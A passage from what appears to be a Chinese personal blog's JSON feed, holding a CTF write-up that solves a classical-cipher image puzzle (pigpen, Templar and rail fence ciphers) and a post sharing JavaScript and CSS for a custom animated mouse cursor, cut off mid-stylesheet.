href=\"#古典密码知多少\">#</a> 古典密码知多少</h2>\n<p><img data-src=\"https://i.loli.net/2021/02/27/uRHNm9SM3ifIJPl.jpg\" alt=\"\" title=\"uhh..可以说是掺杂了各种密码的图谱\" /><br />\nhint 提示最后可能需要用到栅栏密码，还要求我们所有字母大写</p>\n<p>紫色部分有些基础的都可以看出是猪圈密码，我们参照猪圈密码的解码图解开就好了<br />\n<img data-src=\"https://i.loli.net/2021/02/27/v1ZjQlWVEdXLhTB.png\" alt=\"\" /></p>\n<p>get &quot;FGCP&quot; 和 &quot;A&quot; &quot;N&quot;</p>\n<p>橙色部分不太常见，通过百度知道叫做圣殿骑士 (串戏) 密码，由猪圈密码演化而来<br />\n<img data-src=\"https://i.loli.net/2021/02/27/nwBV8d6butsQ3CS.png\" alt=\"\" /></p>\n<p>参照译文得到 &quot;FLI&quot; &quot;S&quot;</p>\n<p>最后，黑色部分更更更没听说过了<br />\n<img data-src=\"https://i.loli.net/2021/02/27/iaKsltmrSZqXGxT.jpg\" alt=\"\" /><br />\n后来百度搜图才知道是个银河什么密码<br />\n不知道该怎么办，给大家表演个原地死王八 *<br />\n<img data-src=\"https://i.loli.net/2021/02/27/ui3WsQzAkxFLTMc.png\" alt=\"\" /><br />\nget &quot;rtu&quot; &quot;yo&quot;</p>\n<p>综上排列一下<br />\n &quot;FGCPFLIRTUASYON&quot;<br />\n 解密得到<br />\n &quot;FLAGISCRYPTOFUN&quot;<br />\n 即 flag 为 CRYPTOFUN</p>\n",
            "tags": [
                "wp",
                "crypto",
                "crypto"
            ]
        },
        {
            "id": "http://kyrita.top/something-4-u/",
            "url": "http://kyrita.top/something-4-u/",
            "title": "something 4 u",
            "date_published": "2021-02-26T03:25:13.317Z",
            "content_html": "<p>关于本主题的指针<br />\n<a id=\"more\"></a><br />\n 我自己用的 shoka，所以直接放在了 public 的 css 和 js 中；源代码如下：</p>\n<p>javascript 部分:</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Math<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">lerp</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> n</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">-</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> a <span class=\"token operator\">+</span> n <span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">getStyle</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">el<span class=\"token punctuation\">,</span> attr</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">return</span> window<span class=\"token punctuation\">.</span>getComputedStyle</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                    <span class=\"token operator\">?</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">getComputedStyle</span><span class=\"token punctuation\">(</span>el<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>attr<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                    <span class=\"token operator\">:</span> el<span class=\"token punctuation\">.</span>currentStyle<span class=\"token punctuation\">[</span>attr<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">class</span> <span class=\"token class-name\">Cursor</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> curr<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> prev<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pt <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">left<span class=\"token punctuation\">,</span> top</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">[</span><span class=\"token string\">\"left\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>left<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">px</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">[</span><span class=\"token string\">\"top\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>top<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">px</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"div\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>id <span class=\"token operator\">=</span> <span class=\"token string\">\"cursor\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hidden\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                    document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token keyword\">var</span> el <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByTagName</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> el<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getStyle</span><span class=\"token punctuation\">(</span>el<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cursor\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"pointer\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pt<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>el<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>outerHTML<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>scr <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"style\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>scr<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">* &#123;cursor: url(\"data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'>&lt;circle cx='4' cy='4' r='4' opacity='.5'/>&lt;/svg>\") 4 4, auto !important&#125;</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token function\">refresh</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>scr<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hover\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"active\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> curr<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> prev<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pt <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmouseover</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pt<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>outerHTML<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hover\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmouseout</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pt<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>outerHTML<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hover\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmousemove</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>curr <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">move</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>clientX <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">.</span>clientY <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>curr <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> x<span class=\"token operator\">:</span> e<span class=\"token punctuation\">.</span>clientX <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> y<span class=\"token operator\">:</span> e<span class=\"token punctuation\">.</span>clientY <span class=\"token operator\">-</span> <span class=\"token number\">8</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hidden\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmouseenter</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hidden\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmouseleave</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hidden\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmousedown</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"active\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                document<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmouseup</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">.</span>classList<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"active\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">lerp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>curr<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> <span class=\"token number\">0.15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">lerp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>curr<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> <span class=\"token number\">0.15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>prev <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pos<span class=\"token punctuation\">.</span>curr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token function\">requestAnimationFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token keyword\">var</span> <span class=\"token constant\">CURSOR</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Cursor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>css 部分：</p>\n<figure class=\"highlight css\"><figcaption data-lang=\"CSS\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token selector\">#cursor</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> fixed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 16px<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 16px<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #000<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 8px<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token property\">opacity</span><span class=\"token punctuation\">:</span> 0.25<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> 10086<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token property\">pointer-events</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> 0.2s ease-in-out<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token property\">transition-property</span><span class=\"token punctuation\">:</span> background<span class=\"token punctuation\">,</span> opacity<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token selector\">#cursor.hidden</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token property\">opacity</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token selector\">#cursor.hover</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token property\">opacity</span><span class=\"token punctuation\">:</span> 0.1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>2.5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token selector\">#cursor.active</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token property\">opacity</span><span class=\"token punctuation\">:</span> 0.5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">scale</span><span class=\"token punctuation\">(</span>0.5<span class=\"token punctuation\">)</span><span 